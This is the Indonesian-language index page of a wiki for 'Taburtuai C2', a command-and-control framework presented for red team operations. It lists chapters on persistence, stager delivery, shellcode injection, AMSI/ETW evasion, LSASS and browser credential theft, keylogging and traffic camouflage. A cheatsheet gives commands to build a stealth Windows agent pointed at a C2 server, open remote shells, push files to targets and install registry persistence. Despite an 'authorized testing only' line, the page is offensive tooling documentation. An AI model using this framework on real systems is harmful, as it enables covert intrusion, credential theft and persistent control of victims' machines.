# Taburtuai C2 — Wiki

**Command & Control Framework untuk Red Team Operations**

> Dokumentasi lengkap dalam Bahasa Indonesia. Semua contoh menggunakan konfigurasi nyata
> yang dapat langsung digunakan dalam engagement.

---

## Daftar Halaman

| # | Halaman | Deskripsi |
|---|---------|-----------|
| 01 | [Introduction](01-introduction.md) | Apa itu Taburtuai, arsitektur, dan komponen utama |
| 02 | [Setup & Instalasi](02-setup.md) | Build, konfigurasi awal, dan persiapan server |
| 03 | [Quickstart](03-quickstart.md) | Dari nol ke agent aktif dalam 10 menit |
| 04 | [Agent Management](04-agents.md) | Kelola, monitor, dan kontrol agent |
| 05 | [Command Execution](05-execution.md) | Eksekusi perintah, interactive shell, history |
| 06 | [File Operations](06-files.md) | Upload, download, dan Alternate Data Stream |
| 07 | [Persistence](07-persistence.md) | Semua metode untuk maintain access |
| 08 | [Process Management](08-process.md) | List, kill, dan start proses di target |
| 09 | [Stager & Delivery](09-stager.md) | Format stager dan cara mengirimkan ke target |
| 10 | [Process Injection](10-injection.md) | Inject shellcode ke proses target |
| 11 | [Evasion](11-evasion.md) | Bypass AMSI, ETW, unhooking, sleep masking |
| 12 | [Credential Access](12-credentials.md) | LSASS dump, SAM, browser passwords |
| 13 | [Reconnaissance](13-recon.md) | Screenshot, keylogger, token impersonation |
| 14 | [Network & Pivoting](14-network.md) | Port scan, ARP scan, SOCKS5 proxy |
| 15 | [Advanced Techniques](15-advanced.md) | BOF, registry ops, OPSEC settings |
| 16 | [Red Team Scenarios](16-scenarios.md) | Skenario engagement end-to-end |
| 17 | [Malleable HTTP Profiles](17-profiles.md) | Camouflage traffic C2 — office365, cdn, jquery, slack, ocsp |
| 18 | [OPSEC Hardening](18-opsec-hardening.md) | String encryption + Authenticode self-signing |
| 19 | [Advanced Transports](19-advanced-transports.md) | DoH beacon, ICMP C2, SMB named pipe |
| 20 | [Multi-Operator Team Server](20-teamserver.md) | Real-time session sharing antar operator |

---

## Referensi Cepat — Cheatsheet

```
# Server
ENCRYPTION_KEY=KEY ./bin/server --port 8000

# Build agent
make agent-win-stealth C2_SERVER=http://IP:PORT ENC_KEY=KEY

# Console
./bin/operator console --server http://IP:PORT

# Di dalam console
agents list                                          # lihat semua agent
shell <id>                                           # interactive shell
cmd <id> "whoami"                                    # satu command
files upload <id> tool.exe C:\Temp\tool.exe          # kirim file
persistence setup <id> --method registry_run --wait  # persist agent
```

---

## Konvensi Dokumen

- `<id>` = agent ID lengkap atau prefix (misal `2703886d`)
- `<cmd-id>` = command ID dari output perintah
- `KEY` = ENCRYPTION_KEY yang sama antara server dan agent
- `IP:PORT` = alamat C2 server yang bisa diakses dari internet/target
- `[--wait]` = opsional, tambahkan untuk tunggu hasil sebelum lanjut

---

*Taburtuai C2 — For authorized security testing only.*
